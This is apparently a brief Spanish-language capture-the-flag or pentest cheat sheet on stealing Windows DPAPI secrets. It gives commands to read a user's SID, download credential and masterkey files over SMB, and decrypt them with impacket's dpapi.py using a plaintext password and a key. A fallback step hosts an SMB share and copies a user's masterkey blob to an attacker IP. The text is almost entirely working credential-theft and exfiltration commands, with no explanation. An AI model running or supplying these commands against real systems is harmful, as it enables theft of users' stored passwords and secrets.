- Sid :
```powershell
whoami /user
```

```bash
mget /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Credentials/772275FAD58525253490A9B0039791D3 

mget /Second-Line Support/Archived Users/todd.wolfe/AppData/Roaming/Microsoft/Protect/S-1-5- 21-3927696377-1337352550-2781715495-1110/08949382-134f-4c63-b93c-ce52efc0aa88
```

- Romperlas
```bash
dpapi.py masterkey -file 08949382-134f-4c63-b93c-ce52efc0aa88 -sid S-1-5-21-3927696377- 1337352550-2781715495-1110 -password NightT1meP1dg3on14
```

- Con la key
```bash
dpapi.py credential -file 772275FAD58525253490A9B0039791D3 -key 0xd2832547d1d5e0a01ef271ede2d299248d1cb0320061fd5355fea2907f9cf879d10c9f329c77c4fd0b9bf83a9e2 40ce2b8a9dfb92a0d15969ccae6f550650a83
```


- Si no puedo descargrlo
```bash
impacket-smbserver share $(pwd) -smb2support


copy "C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407" \\10.10.14.xx\share\masterkey_blob
```
